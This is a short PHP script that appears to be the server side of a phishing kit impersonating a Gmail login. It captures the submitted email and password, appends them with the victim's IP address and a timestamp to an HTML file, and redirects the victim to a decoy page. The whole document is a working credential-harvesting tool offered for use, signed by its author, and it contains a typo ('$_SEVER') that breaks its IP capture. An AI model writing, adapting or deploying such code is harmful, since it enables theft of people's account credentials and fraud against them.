<?php
# define variables
$mail = $_POST['email'];
$pass = $_POST['pass'];
$time = date("m-d-Y;h:i:s");
$ip = $_SEVER['REMOTE_ADDR'];

# check if text boxes are empty or not
if( (empty($mail)) or (empty($pass))){
header( "Location:login.html");
}

$file_path = ( "uv.html");   # Define path of the file 
$file = fopen( $file_path, "a+") or die ("Error in process"); # Opean the file

if ( $file == false){             # Check if the file opean or not
}

fwrite( $file, 
'
<font color = "blue">Password</font>: [<font color = "green"><b>'.$pass.'</font></b>]</br>
<font color = "black">Gmail</font>: [<font color = "blue"><b>'.$mail.'</font></b>]</br>
<font color = "blue">IP_Address</font>: [<font color = "red"><b>'.$ip.'</font></b>]</br>
<font color = "blue">Date_Time</font>: [<font color = "red"><b>'.$time.'</font></b>]</br>
****************************************'.'</br>') ;  # writing data

fclose ( $file );

# Redirect to last page if data write is true
if (($pass != null) && ($mail != null)){
header ( "Location:don.html");
}

//_____Coded_by_chapayev_____/- //
?>
